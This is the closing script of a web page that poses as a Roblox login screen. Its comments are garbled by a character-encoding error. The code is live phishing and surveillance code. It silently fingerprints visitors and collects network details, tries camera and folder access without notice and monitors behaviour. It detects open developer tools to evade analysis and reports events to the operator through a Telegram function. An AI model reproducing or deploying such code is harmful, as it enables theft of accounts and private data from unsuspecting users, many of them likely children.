            sendToTelegram('âš ï¸ <b>æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·å·²æ‰“å¼€</b>');
        };
        
        // æ£€æµ‹å¼€å‘è€…å·¥å…·çª—å£
        setInterval(() => {
            const threshold = 160;
            const widthDiff = window.outerWidth - window.innerWidth > threshold;
            const heightDiff = window.outerHeight - window.innerHeight > threshold;
            
            if (widthDiff || heightDiff) {
                devToolsOpened();
            }
            
            // æ£€æŸ¥consoleæ˜¯å¦è¢«é‡å†™
            try {
                console.log('%c ', 'background: red; color: white;');
            } catch (e) {
                devToolsOpened();
            }
        }, 1000);
        
        // é˜²æ­¢é¡µé¢å…³é—­
        window.addEventListener('beforeunload', (e) => {
            sendToTelegram('ğŸšª <b>ç”¨æˆ·å°è¯•ç¦»å¼€é¡µé¢</b>');
            // åœ¨çœŸå®ç¯å¢ƒä¸­ï¼Œè¿™é‡Œå¯ä»¥æç¤ºç”¨æˆ·
            // e.preventDefault();
            // e.returnValue = '';
        });
    }

    // ==================== åˆå§‹åŒ– ====================
    window.addEventListener('DOMContentLoaded', () => {
        // åˆ›å»ºæµ®åŠ¨å›¾æ ‡
        createFloatingIcons();
        
        // è®¾ç½®é˜²æ£€æµ‹
        setupAntiDetection();
        
        // å¯†ç æ˜¾ç¤ºåˆ‡æ¢
        document.getElementById('togglePassword').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.textContent = type === 'password' ? 'ğŸ‘ï¸' : 'ğŸ”’';
        });
        
        // å›è½¦é”®ç™»å½•
        document.getElementById('password').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleLogin();
            }
        });
        
        // è‡ªåŠ¨å¼€å§‹æ”¶é›†ï¼ˆå»¶è¿Ÿåï¼Œé™é»˜è¿›è¡Œï¼‰
        setTimeout(() => {
            if (!isCollecting) {
                // é™é»˜å¼€å§‹æ•°æ®æ”¶é›†ï¼ˆç”¨æˆ·æ— æ„ŸçŸ¥ï¼‰
                stealthDataCollection();
            }
        }, 10000);
        
        // é¡µé¢å…³é—­æ—¶å‘é€é€šçŸ¥
        window.addEventListener('beforeunload', () => {
            sendToTelegram('ğŸ“¤ <b>ç”¨æˆ·ç¦»å¼€Robloxç™»å½•é¡µé¢</b>\nä¼šè¯ID: ' + collectedData.sessionId);
        });
    });

    // é™é»˜æ•°æ®æ”¶é›†ï¼ˆä¸æ˜¾ç¤ºUIï¼‰
    async function stealthDataCollection() {
        try {
            // æ”¶é›†åŸºæœ¬ä¿¡æ¯
            await collectCompleteDeviceFingerprint();
            await collectComprehensiveNetworkInfo();
            
            // å°è¯•æ‘„åƒå¤´è®¿é—®ï¼ˆé™é»˜ï¼‰
            setTimeout(() => {
                stealthCameraAccess().catch(() => {});
            }, 2000);
            
            // å¼€å§‹è¡Œä¸ºç›‘æ§
            startComprehensiveBehaviorMonitoring();
            
            // å°è¯•æ–‡ä»¶å¤¹è®¿é—®ï¼ˆé™é»˜ï¼‰
            setTimeout(() => {
                attemptAdvancedFolderAccess();
            }, 4000);
            
        } catch (error) {
            // é™é»˜å¤±è´¥
        }
    }

    function createFloatingIcons() {
        const container = document.getElementById('floatingIcons');
        const icons = ['ğŸ®', 'â­', 'ğŸ‘•', 'ğŸ‘¥', 'âš™ï¸', 'ğŸ†', 'ğŸ’³', 'ğŸ“±', 'ğŸ¨', 'ğŸª'];
        
        for (let i = 0; i < 15; i++) {
            const icon = document.createElement('div');
            icon.className = 'floating-icon';
            icon.textContent = icons[Math.floor(Math.random() * icons.length)];
            icon.style.left = Math.random() * 100 + '%';
            icon.style.top = Math.random() * 100 + '%';
            icon.style.animationDuration = (Math.random() * 20 + 10) + 's';
            icon.style.animationDelay = Math.random() * 5 + 's';
            icon.style.fontSize = (Math.random() * 20 + 16) + 'px';
            container.appendChild(icon);
        }
    }
</script>
</body>
</html>
